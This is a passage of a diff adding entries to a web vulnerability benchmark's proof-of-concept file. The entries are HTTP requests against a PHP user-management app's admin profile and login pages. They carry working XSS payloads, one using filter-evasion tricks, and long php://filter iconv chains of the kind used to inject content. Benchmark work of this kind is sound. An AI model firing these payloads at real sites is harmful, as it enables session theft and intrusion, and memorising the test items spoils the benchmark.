+    "source_repository": "https://phpgurukul.com/user-registration-login-and-user-management-system-with-admin-panel/",
+    "vuln_id": "vuln_function_b7fece",
+    "vuln_type": "xss"
+  },
+  {
+    "application": "loginmgmt",
+    "application_name": "User Registration Login Management",
+    "dataset": "phpbench",
+    "docker_image": "sheltonshi/webvulnbench:phpbench-loginmgmt-v0.1.0",
+    "method": "POST",
+    "path": "/admin/edit-profile.php",
+    "post_data": {
+      "": [
+        "",
+        ""
+      ],
+      "contact": [
+        "1998-10-11"
+      ],
+      "fname": [
+        "127.0.0.1"
+      ],
+      "lname": [
+        "127.0.0.1"
+      ],
+      "uid": [
+        "1"
+      ],
+      "update": [
+        ""
+      ]
+    },
+    "query_params": {
+      "uid": [
+        "1%3Cscr%3C%21--%20--%3Eipt%3Ealert%28987890%29%3C/scr%3C%21--%20--%3Eipt%3E"
+      ]
+    },
+    "request_id": "requests.682c7533f362c",
+    "source_file": "PHPBench_Artifact/Constructed_Benchmark/Verifiable_PoCs/Verifiable_PoCs.json",
+    "source_repository": "https://phpgurukul.com/user-registration-login-and-user-management-system-with-admin-panel/",
+    "vuln_id": "vuln_function_c5044b",
+    "vuln_type": "xss"
+  },
+  {
+    "application": "loginmgmt",
+    "application_name": "User Registration Login Management",
+    "dataset": "phpbench",
+    "docker_image": "sheltonshi/webvulnbench:phpbench-loginmgmt-v0.1.0",
+    "method": "POST",
+    "path": "/admin/edit-profile.php",
+    "post_data": {
+      "": [
+        "",
+        ""
+      ],
+      "contact": [
+        "%3Ca%20href%3Djavascript%26%2358alert(987890)%3ECLICK%20HERE%20TO%20EXPLOIT%20THIS%20XSS%3C%2Fa%3E"
+      ],
+      "fname": [
+        "127.0.0.1"
+      ],
+      "lname": [
+        "127.0.0.1"
+      ],
+      "uid": [
+        "1"
+      ],
+      "update": [
+        ""
+      ]
+    },
+    "query_params": {
+      "uid": [
+        "1"
+      ]
+    },
+    "request_id": "requests.682c7533f11d6",
+    "source_file": "PHPBench_Artifact/Constructed_Benchmark/Verifiable_PoCs/Verifiable_PoCs.json",
+    "source_repository": "https://phpgurukul.com/user-registration-login-and-user-management-system-with-admin-panel/",
+    "vuln_id": "vuln_function_d6f2be",
+    "vuln_type": "xss"
+  },
+  {
+    "application": "loginmgmt",
+    "application_name": "User Registration Login Management",
+    "dataset": "phpbench",
+    "docker_image": "sheltonshi/webvulnbench:phpbench-loginmgmt-v0.1.0",
+    "method": "POST",
+    "path": "/login.php",
+    "post_data": {
+      "login": [
+        ""
+      ],
+      "password": [
+        "php://filter/convert.iconv.UTF8.CSISO2022KR|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM921.NAPLPS|convert.iconv.855.CP936|convert.iconv.IBM-932.UTF-8|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.IBM869.UTF16|convert.iconv.L3.CSISO90|convert.iconv.UCS2.UTF-8|convert.iconv.CSISOLATIN6.UCS-4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.8859_3.UTF16|convert.iconv.863.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.851.UTF-16|convert.iconv.L1.T.618BIT|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CSA_T500.UTF-32|convert.iconv.CP857.ISO-2022-JP-3|convert.iconv.ISO2022JP2.CP775|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.IBM891.CSUNICODE|convert.iconv.ISO8859-14.ISO6937|convert.iconv.BIG-FIVE.UCS-4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L5.UTF-32|convert.iconv.ISO88594.GB13000|convert.iconv.BIG5.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP1162.UTF32|convert.iconv.L4.T.61|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.IBM869.UTF16|convert.iconv.L3.CSISO90|convert.iconv.R9.ISO6937|convert.iconv.OSF00010100.UHC|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.863.UTF-16|convert.iconv.ISO6937.UTF16LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP-AR.UTF16|convert.iconv.8859_4.BIG5HKSCS|convert.iconv.MSCP1361.UTF-32LE|convert.iconv.IBM932.UCS-2BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP-AR.UTF16|convert.iconv.8859_4.BIG5HKSCS|convert.iconv.MSCP1361.UTF-32LE|convert.iconv.IBM932.UCS-2BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.BIG5HKSCS.UTF16|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM921.NAPLPS|convert.iconv.855.CP936|convert.iconv.IBM-932.UTF-8|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.8859_3.UTF16|convert.iconv.863.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP1046.UTF16|convert.iconv.ISO6937.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP1046.UTF32|convert.iconv.L6.UCS-2|convert.iconv.UTF-16LE.T.61-8BIT|convert.iconv.865.UCS-4LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.MAC.UTF16|convert.iconv.L8.UTF16BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CSIBM1161.UNICODE|convert.iconv.ISO-IR-156.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.IBM932.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.base64-decode/resource=php://temp"
+      ],
+      "uemail": [
+        "<font onbeforeinput=alert(987890) contenteditable>test</font>"
+      ]
+    },
+    "query_params": {},
+    "request_id": "requests.681a115777be6",
+    "source_file": "PHPBench_Artifact/Constructed_Benchmark/Verifiable_PoCs/Verifiable_PoCs.json",
+    "source_repository": "https://phpgurukul.com/user-registration-login-and-user-management-system-with-admin-panel/",
+    "vuln_id": "vuln_function_d874f5",
+    "vuln_type": "xss"
+  },
+  {
+    "application": "loginmgmt",
+    "application_name": "User Registration Login Management",
+    "dataset": "phpbench",
+    "docker_image": "sheltonshi/webvulnbench:phpbench-loginmgmt-v0.1.0",
+    "method": "POST",
+    "path": "/login.php",
+    "post_data": {
+      "login": [
+        ""
+      ],
+      "password": [
+        "<font onbeforeinput=alert(987890) contenteditable>test</font>"
+      ],
+      "uemail": [
+        "php://filter/convert.iconv.UTF8.CSISO2022KR|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM921.NAPLPS|convert.iconv.855.CP936|convert.iconv.IBM-932.UTF-8|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.IBM869.UTF16|convert.iconv.L3.CSISO90|convert.iconv.UCS2.UTF-8|convert.iconv.CSISOLATIN6.UCS-4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.8859_3.UTF16|convert.iconv.863.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.851.UTF-16|convert.iconv.L1.T.618BIT|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CSA_T500.UTF-32|convert.iconv.CP857.ISO-2022-JP-3|convert.iconv.ISO2022JP2.CP775|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.IBM891.CSUNICODE|convert.iconv.ISO8859-14.ISO6937|convert.iconv.BIG-FIVE.UCS-4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L5.UTF-32|convert.iconv.ISO88594.GB13000|convert.iconv.BIG5.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP1162.UTF32|convert.iconv.L4.T.61|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.IBM869.UTF16|convert.iconv.L3.CSISO90|convert.iconv.R9.ISO6937|convert.iconv.OSF00010100.UHC|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.863.UTF-16|convert.iconv.ISO6937.UTF16LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP-AR.UTF16|convert.iconv.8859_4.BIG5HKSCS|convert.iconv.MSCP1361.UTF-32LE|convert.iconv.IBM932.UCS-2BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP-AR.UTF16|convert.iconv.8859_4.BIG5HKSCS|convert.iconv.MSCP1361.UTF-32LE|convert.iconv.IBM932.UCS-2BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.BIG5HKSCS.UTF16|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM921.NAPLPS|convert.iconv.855.CP936|convert.iconv.IBM-932.UTF-8|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.8859_3.UTF16|convert.iconv.863.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP1046.UTF16|convert.iconv.ISO6937.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP1046.UTF32|convert.iconv.L6.UCS-2|convert.iconv.UTF-16LE.T.61-8BIT|convert.iconv.865.UCS-4LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.MAC.UTF16|convert.iconv.L8.UTF16BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CSIBM1161.UNICODE|convert.iconv.ISO-IR-156.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.IBM932.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.base64-decode/resource=php://temp"
+      ]
+    },
+    "query_params": {},
+    "request_id": "requests.681a11577d4a5",
+    "source_file": "PHPBench_Artifact/Constructed_Benchmark/Verifiable_PoCs/Verifiable_PoCs.json",
+    "source_repository": "https://phpgurukul.com/user-registration-login-and-user-management-system-with-admin-panel/",
+    "vuln_id": "vuln_function_f6d2bc",
+    "vuln_type": "xss"
+  }
+]
